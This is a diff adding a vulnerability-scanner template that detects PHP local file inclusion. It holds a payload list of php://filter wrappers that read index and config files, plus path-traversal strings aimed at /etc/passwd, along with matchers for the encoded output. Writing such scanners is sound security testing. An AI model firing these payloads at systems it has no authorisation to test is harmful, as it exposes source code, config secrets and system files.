@@ -1,0 +1,122 @@
+id: lfi-php-filter
+
+info:
+  name: LFI - PHP Filter Wrapper Detection
+  author: custom
+  severity: high
+  description: Detects Local File Inclusion (LFI) vulnerability using PHP filter wrappers to read common PHP files
+  tags: lfi,php,file-inclusion,filter,custom
+  reference:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+    - https://www.php.net/manual/en/wrappers.php.php
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?{{param}}={{payload}}"
+
+    payloads:
+      param:
+        - "page"
+        - "file"
+        - "path"
+        - "template"
+        - "include"
+        - "view"
+        - "cat"
+        - "lang"
+        - "document"
+        - "folder"
+        - "load"
+
+      payload:
+        # Base64 encoding - most common files
+        - "php://filter/convert.base64-encode/resource=index"
+        - "php://filter/convert.base64-encode/resource=main"
+        - "php://filter/convert.base64-encode/resource=config"
+        - "php://filter/convert.base64-encode/resource=../config"
+
+        # Base64 encoding - absolute paths
+        - "php://filter/convert.base64-encode/resource=/var/www/html/index"
+        - "php://filter/convert.base64-encode/resource=/var/www/html/config"
+
+        # ROT13 encoding
+        - "php://filter/read=string.rot13/resource=index"
+        - "php://filter/read=string.rot13/resource=main"
+        - "php://filter/read=string.rot13/resource=config"
+
+        # Path traversal
+        - "../../../../var/www/html/index"
+        - "../../../../../../etc/passwd"
+        - "../../../index"
+
+    attack: clusterbomb
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: lfi-base64-php-opening-tag
+        dsl:
+          - 'contains(body, "PD9waHA")'
+          - 'status_code == 200'
+        condition: and
+
+      - type: dsl
+        name: lfi-base64-html-tag
+        dsl:
+          - 'contains(body, "PGh0bWw")'
+          - 'contains(body, "PD")'
+          - 'status_code == 200'
+        condition: and
+
+      - type: dsl
+        name: lfi-base64-title-tag
+        dsl:
+          - 'contains(body, "PHRpdGxl")'
+          - 'status_code == 200'
+        condition: and
+
+      - type: dsl
+        name: lfi-base64-include-require
+        dsl:
+          - 'contains(body, "aW5jbHVkZQ")'
+          - 'contains(body, "cmVxdWlyZQ")'
+          - 'status_code == 200'
+        condition: or
+
+      - type: regex
+        name: lfi-base64-long-pattern
+        part: body
+        regex:
+          - '[A-Za-z0-9+/]{200,}={0,2}'
+        condition: and
+
+      - type: dsl
+        name: lfi-rot13-php-tag
+        dsl:
+          - 'contains(body, "<?cuc")'
+          - 'status_code == 200'
+        condition: and
+
+      - type: dsl
+        name: lfi-rot13-include
+        dsl:
+          - 'contains(body, "vapyhqr")'
+          - 'contains(body, "erdhver")'
+          - 'status_code == 200'
+        condition: or
+
+    extractors:
+      - type: regex
+        name: base64-content
+        part: body
+        regex:
+          - '(?s)<div class="container">\s*([A-Za-z0-9+/=]{50,})'
+          - '[A-Za-z0-9+/]{150,}={0,2}'
+
+      - type: kval
+        part: body
+        kval:
+          - base64_decode
